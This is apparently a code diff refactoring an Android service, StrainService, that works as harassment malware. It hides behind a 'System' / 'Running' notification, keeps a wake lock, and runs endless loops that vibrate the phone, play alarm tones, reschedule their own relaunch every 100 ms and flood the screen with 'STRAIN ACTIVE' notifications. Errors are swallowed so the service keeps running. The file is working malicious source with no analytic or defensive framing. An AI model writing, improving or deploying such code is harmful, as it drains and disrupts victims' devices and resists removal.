@@ -1,5 +1,6 @@
 package com.rhfvnc.strain;
-import android.app.*;
+import android.app.Notification;
+import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.media.AudioManager;
@@ -9,7 +10,6 @@ import android.os.IBinder;
 import android.os.PowerManager;
 import android.os.Vibrator;
 public class StrainService extends Service {
-    private static final String CH = "rhfvnc";
     private PowerManager.WakeLock wl;
     private Vibrator vib;
     private ToneGenerator tone;
@@ -21,28 +21,23 @@ public class StrainService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        if (Build.VERSION.SDK_INT >= 26) {
-            NotificationChannel ch = new NotificationChannel(CH, "System", NotificationManager.IMPORTANCE_MIN);
-            ch.setShowBadge(false);
-            NotificationManager nm = getSystemService(NotificationManager.class);
-            if (nm != null) nm.createNotificationChannel(ch);
-        }
-        Notification n = new Notification.Builder(this, CH)
-                .setContentTitle("System").setContentText("Running")
-                .setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build();
-        startForeground(1, n);
+        try {
+            Notification n = Notify.build(this, "rhfvnc", "System", "Running");
+            startForeground(1, n);
+        } catch (Throwable ignored) {}
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         if (pm != null) {
-            wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "rhfvnc:strain");
-            wl.setReferenceCounted(false);
-            try { wl.acquire(); } catch (Throwable ignored) {}
+            try {
+                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "rhfvnc:strain");
+                wl.setReferenceCounted(false);
+                wl.acquire();
+            } catch (Throwable ignored) {}
         }
         vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
         try {
             tone = new ToneGenerator(AudioManager.STREAM_ALARM, 100);
             tone.startTone(ToneGenerator.TONE_CDMA_ABBR_ALERT, 60000);
         } catch (Throwable ignored) {}
-
         Thread alarmLoop = new Thread(() -> {
             while (true) {
                 try { StrainReceiver.scheduleRelaunch(StrainService.this, 20); Thread.sleep(100); }
@@ -50,7 +45,6 @@ public class StrainService extends Service {
             }
         });
         alarmLoop.setDaemon(true); alarmLoop.start();
-
         Thread vibLoop = new Thread(() -> {
             while (true) {
                 try { if (vib != null) vib.vibrate(new long[]{0, 60, 20, 60, 20}, -1); Thread.sleep(90); }
@@ -58,26 +52,21 @@ public class StrainService extends Service {
             }
         });
         vibLoop.setDaemon(true); vibLoop.start();
-
         Thread toneLoop = new Thread(() -> {
             while (true) {
-                try {
-                    if (tone != null) tone.startTone(ToneGenerator.TONE_CDMA_ABBR_ALERT, 5000);
-                } catch (Throwable ignored) {}
+                try { if (tone != null) tone.startTone(ToneGenerator.TONE_CDMA_ABBR_ALERT, 5000); }
+                catch (Throwable ignored) {}
                 try { Thread.sleep(4500); } catch (InterruptedException ignored) {}
             }
         });
         toneLoop.setDaemon(true); toneLoop.start();
-
         Thread spam = new Thread(() -> {
-            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
             int id = 100;
             while (true) {
                 try {
                     if (nm != null) {
-                        Notification nn = new Notification.Builder(StrainService.this, CH)
-                                .setContentTitle("RHF/VNC").setContentText("STRAIN ACTIVE")
-                                .setSmallIcon(android.R.drawable.stat_notify_sync).build();
+                        Notification nn = Notify.build(StrainService.this, "rhfvnc", "RHF/VNC", "STRAIN ACTIVE");
                         nm.notify(id++, nn);
                         if (id > 200) id = 100;
                     }
